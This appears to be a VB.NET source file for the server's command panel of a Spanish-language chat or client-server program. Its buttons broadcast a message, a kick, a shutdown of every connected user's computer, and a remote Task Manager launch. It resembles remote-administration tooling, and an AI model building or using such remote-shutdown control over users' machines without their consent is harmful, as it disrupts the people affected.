Public Class Command

    Private Sub Command_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub TextBox1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            If TextBox1.Text = "CMD.Say=" Then
                ListBox1.Items.Add("Comando: " & TextBox1.Text)
                TextBox1.ReadOnly = True
                TextBox2.Focus()
            End If

            If TextBox1.Text = "CMD.Kick={ALL}" Then
                ListBox1.Items.Add("Comando: " & TextBox1.Text)
                Servidor.ENVIARTODOS("CMD.Kick={ALL}")
            End If

            If TextBox1.Text = "CMD.Shutdown={ALL};-h" Then
                ListBox1.Items.Add("Comando: " & TextBox1.Text)
                Servidor.ENVIARTODOS("CMD.Shutdown={ALL};-h")
            End If

            If TextBox1.Text = "CMD.Aplication.Start=TaskMGR;{ALL}" Then
                ListBox1.Items.Add("Comando: " & TextBox1.Text)
                Servidor.ENVIARTODOS("CMD.Aplication.Start=TaskMGR;{ALL}")
            End If
        End If
    End Sub

    Private Sub TextBox2_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox2.KeyDown
        If e.KeyCode = Keys.Enter Then

            If TextBox1.Text = "CMD.Say=" Then
                Servidor.ENVIARTODOS(TextBox2.Text)
                ListBox1.Items.Add("CMD.Say= " & TextBox2.Text)
                Servidor.RichTextBox1.AppendText(vbCrLf & "---Enviaste como Servidor: " & TextBox2.Text)
                Servidor.RichTextBox1.ScrollToCaret()
                TextBox1.ReadOnly = False
                TextBox2.Focus()
                TextBox1.Clear()
                TextBox2.Clear()

            End If
        End If
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Servidor.ENVIARTODOS("CMD.Kick={ALL}")
        ListBox1.Items.Add("CMD.Kick={ALL} | Expulsaste a todos los Usuarios Conectados")
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Servidor.ENVIARTODOS("CMD.Shutdown={ALL};-h")
        ListBox1.Items.Add("CMD.Shutdown={ALL};-h | Apagaste los Computadores de los Usuarios Conectados [-h]")
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Servidor.ENVIARTODOS("CMD.Aplication.Start=TaskMGR;{ALL}")
        ListBox1.Items.Add("CMD.Aplication.Start=TaskMGR;{ALL} | Iniciaste el TaskMgr de los Usuarios Conectados")
    End Sub
End Class